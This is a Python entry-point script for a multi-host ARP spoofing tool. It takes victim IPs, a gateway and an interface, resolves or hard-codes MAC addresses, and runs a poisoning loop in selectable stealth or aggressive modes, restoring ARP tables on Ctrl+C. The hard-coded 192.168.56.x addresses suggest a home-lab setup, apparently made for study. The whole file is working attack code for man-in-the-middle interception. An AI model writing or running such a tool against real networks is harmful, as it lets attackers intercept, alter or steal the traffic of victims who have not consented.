import argparse
import signal
import sys
import os
from .arp_utils import get_mac, restore
from .arp_modes import poison_loop

# ================================
# Main Program Entry Point
# ================================
def main():
    # --- Command-line Interface ---
    parser = argparse.ArgumentParser(description="Multi-Host ARP Spoofing Tool with Operational Modes")
    parser.add_argument("--victims", nargs="+", required=True, help="List of victim IPs")
    parser.add_argument("--gateway", required=True, help="IP of the gateway or middle host")
    parser.add_argument("--iface", required=True, help="Network interface (e.g., eth0, enp0s3)")
    parser.add_argument("--mode", choices=["silent", "aggressive", "custom"], default="custom", help="Spoofing mode")
    parser.add_argument("--sleep", type=float, default=2.0, help="Custom sleep time (used only in custom mode)")
    parser.add_argument("--manual", action="store_true", help="Use hardcoded MAC addresses instead of resolving")

    args = parser.parse_args()

    iface = args.iface
    gateway_ip = args.gateway
    victim_ips = args.victims

    # --- Get MAC Addresses of M1,M2 for testing puposes---
    if args.manual:
        print("[*] Using hardcoded MAC addresses (manual mode).")
        hardcoded_victims = {
            "192.168.56.101": "08:00:27:B7:C4:AF",
            "192.168.56.102": "08:00:27:D0:25:4B",
        }
        # MAC of M2
        mac_gateway = "08:00:27:CC:08:6F"
        victim_macs = {ip: hardcoded_victims[ip] for ip in victim_ips}
    else:
        print("[*] Resolving MAC addresses dynamically...")
        mac_gateway = get_mac(gateway_ip, iface)
        victim_macs = {ip: get_mac(ip, iface) for ip in victim_ips}

    # --- Display Results ---
    print(f"[+] Gateway MAC: {mac_gateway}")
    for ip, mac in victim_macs.items():
        print(f"[+] Victim {ip} MAC: {mac}")

    # --- Ctrl+C restores ARP tables ---
    def stop(sig, frame):
        print("\n[!] Ctrl+C detected — restoring ARP tables...")
        for ip, mac in victim_macs.items():
            restore(ip, mac, gateway_ip, mac_gateway, iface)
            restore(gateway_ip, mac_gateway, ip, mac, iface)
        print("Network restored.")
        sys.exit(0)

    signal.signal(signal.SIGINT, stop)

    # --- ARP Spoofing Loop ---
    print(f"Starting ARP spoofing in '{args.mode}' mode. Press Ctrl+C to stop.")
    sleep_time = {"silent": 10.0, "aggressive": 0.5}.get(args.mode, args.sleep)
    poison_loop(victim_macs, gateway_ip, mac_gateway, iface, sleep_time)

# ================================
# Run If Executed as Script
# ================================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Please run this script as root (sudo).")
        sys.exit(1)
    main()
